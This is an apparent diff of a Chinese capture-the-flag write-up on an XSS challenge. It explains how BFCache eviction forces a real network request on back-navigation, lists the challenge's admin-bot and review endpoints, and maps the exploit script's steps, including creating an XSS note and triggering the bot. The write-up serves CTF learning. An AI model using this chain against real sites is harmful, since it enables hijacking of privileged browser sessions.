 对照实验中：直接回退命中了 BFCache（无请求，链路死掉）；先连开 8 个新文档再回退，才变成真实的网络请求。原因是 Chromium（Chrome 浏览器的开源内核）给每个标签页的 BFCache 条目数量设置有上限，**连续加载足够多的新文档会把最早的条目挤出缓存**，被挤出的条目再回退时只能重新向服务器请求。
 
-stage1 里负责这件事的代码（即 2.5 前置块里 stage1 页面的第二段 JS，此处单独看）：
+stage1 里负责这件事的代码（即 2.5.2 里 attacker.js 的 `/stage1` 路由拼出的第二段 JS，此处单独看）：
 
 ```js
 // 每次导航间隔 120ms，连做 8 次，把历史堆到 11 条
@@ -1095,7 +1126,7 @@ else { setTimeout(function(){ history.go(-10); }, 200); }   // 回退 10 步到�
 | POST | `/create` | 无 | 创建笔记（标题≤10 个字符，HTML≤128 个字符） |
 | GET | `/note/:id` | 无 | 预览笔记（CSP 严格防护，转义输出） |
 | POST | `/report` | 无 | 提交待审查网址，触发机器人；从网址的 `note` 参数提取笔记编号 |
-| GET | `/reports/session` | 机器人令牌 | 把当前会话升级为管理员 |
+| GET | `/reports/session` | 机器人令牌 | 管理员登录（把当前会话标记为管理员） |
 | GET | `/reports/check` | 管理员 | 审查页。首访只留标记；二访进入渲染分支，全部检查通过才输出笔记原文 |
 | POST | `/reports/arm/:id` | 机器人令牌 | 置 `prepared=true`，表示机器人已就位 |
 | GET | `/review` | 管理员 + rid 匹配 | 打开审查界面：登记攻击脚本 URL，渲染带沙箱 iframe 的页面 |
@@ -1107,9 +1138,9 @@ else { setTimeout(function(){ history.go(-10); }, 200); }   // 回退 10 步到�
 
 ### 3.2 批准交互：`/review`、`/sandbox`、`/complete`
 
-这三个端点共同构成"审查交互"，也是攻击脚本能进入机器人浏览器的唯一方式。
+> 一句话机制：攻击脚本要进入挑战域，靠的不是直接请求，而是让机器人打开审查界面；审查界面把脚本装进沙箱 iframe 运行，并用一次"批准"（`/complete`）为最终渲染放行。
 
-一句话机制：攻击脚本要进入挑战域，靠的不是直接请求，而是让机器人打开审查界面；审查界面把脚本装进沙箱 iframe 运行，并用一次"批准"（`/complete`）为最终渲染放行。
+这三个端点共同构成"审查交互"，也是攻击脚本能进入机器人浏览器的唯一方式。
 
 **`/review`**：管理员打开后，服务器把 URL 参数 `u`（攻击者提供的地址）登记为"待审查文档"，然后渲染审查界面：
 
@@ -1319,7 +1350,7 @@ srv.listen(PORT, async () => {
 
 | 脚本部分 | 作用 | 对应章节 |
 |---|---|---|
-| `/reports/session` 一行 | 调试残留：把脚本内浏览器升级为管理员（创建笔记与提交审查都不检查身份，这一步对主链没有功能贡献，保留以与实测脚本一致；实测去掉令牌头后完整链仍成功，该步骤不参与拿 flag） | 2.5 |
+| `/reports/session` 一行 | 调试残留：以管理员身份登录（创建笔记与提交审查都不检查身份，这一步对主链没有功能贡献，保留以与实测脚本一致；实测去掉令牌头后完整链仍成功，该步骤不参与拿 flag） | 2.5 |
 | `p.evaluate(fetch /create)` | 创建含 XSS 的笔记，取回编号 | 2.2、2.3 |
 | `p.evaluate(fetch /report)` | 提交 `stage1?note=编号`，触发机器人 | 2.5 |
 | `/stage1` 页面的 `window.open` | 弹窗打开审查界面，登记 S2 | 2.9 |
